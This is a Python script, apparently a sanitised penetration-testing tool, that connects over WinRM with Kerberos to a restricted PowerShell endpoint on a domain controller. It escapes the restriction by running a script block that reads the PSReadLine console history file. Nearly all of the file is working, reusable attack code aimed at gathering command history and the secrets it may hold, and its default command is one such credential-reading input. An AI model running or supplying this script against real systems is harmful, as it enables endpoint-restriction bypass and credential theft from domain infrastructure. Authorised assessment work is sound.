#!/usr/bin/env python3
"""
psrp_restricted_history.py

Original operator script used during an internal Active Directory assessment to
read PowerShell console history from a *restricted* PowerShell endpoint
(configuration_name="restricted"). The endpoint blocks many cmdlets, but script
blocks ( &{ ... } ) still execute, which allows reading PSReadLine history files.

This is the sanitised, reusable version. Replace the placeholders with your
engagement values. No real client identifiers, hosts, or credentials are included.

Requirements:
    pip install pypsrp krb5 gssapi

Usage:
    export KRB5CCNAME=<user>.ccache
    python3 psrp_restricted_history.py --dc dc-a01.corp.local
"""

import argparse
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool


def main():
    parser = argparse.ArgumentParser(
        description="Read PowerShell history from a restricted WinRM endpoint via Kerberos."
    )
    parser.add_argument(
        "--dc",
        required=True,
        help="Target domain controller FQDN (e.g. dc-a01.corp.local)",
    )
    parser.add_argument(
        "--endpoint",
        default="restricted",
        help="PowerShell configuration name (default: restricted)",
    )
    parser.add_argument(
        "--command",
        default=r"&{(Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt) -join \"`n\"}",
        help="Script block to execute on the restricted endpoint",
    )
    args = parser.parse_args()

    conf = WSMan(args.dc, auth="kerberos", password=None, ssl=False)

    with RunspacePool(conf, configuration_name=args.endpoint) as pool:
        ps = PowerShell(pool)
        ps.add_script(args.command)
        outputs = ps.invoke()
        for output in outputs:
            print(output)
        for error in ps.streams.error:
            print(f"[!] {error}")


if __name__ == "__main__":
    main()
